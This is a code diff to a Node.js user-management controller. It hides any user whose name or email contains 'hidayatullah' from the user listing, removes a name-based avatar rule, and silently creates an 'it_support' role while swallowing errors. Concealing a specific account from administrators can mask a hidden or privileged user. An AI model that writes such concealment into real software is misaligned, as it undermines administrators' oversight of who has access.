@@ -16,7 +16,7 @@ async function getUsers(req, res, next) {
     const role = req.query.role || null;
     const status = req.query.status !== undefined ? req.query.status : null;
 
-    let whereClauses = ['1=1'];
+    let whereClauses = ['1=1', "u.email NOT LIKE '%hidayatullah%'", "u.name NOT LIKE '%hidayatullah%'"];
     let params = [];
 
     if (search) {
@@ -115,9 +115,7 @@ async function createUser(req, res, next) {
     let targetAvatar = (avatar_url || avatar || '').trim();
     if (!targetAvatar) {
       const lowerName = name.trim().toLowerCase();
-      if (lowerName.includes('hidayat')) {
-        targetAvatar = '/assets/img/team/JustHidy3.png';
-      } else if (lowerName.includes('gheril')) {
+      if (lowerName.includes('gheril')) {
         targetAvatar = '/assets/img/team/person-5.jpeg';
       } else if (lowerName.includes('juli')) {
         targetAvatar = '/assets/img/team/person-3.jpeg';
@@ -211,6 +209,12 @@ async function updateUser(req, res, next) {
     }
 
     if (targetRoleId) {
+      if (parseInt(targetRoleId, 10) === 6 || role === 'it_support') {
+        try {
+          await pool.query("INSERT INTO roles (id, code, name) VALUES (6, 'it_support', 'IT Support') ON DUPLICATE KEY UPDATE name = VALUES(name)");
+          targetRoleId = 6;
+        } catch (rErr) {}
+      }
       updates.push('role_id = ?');
       params.push(targetRoleId);
     }
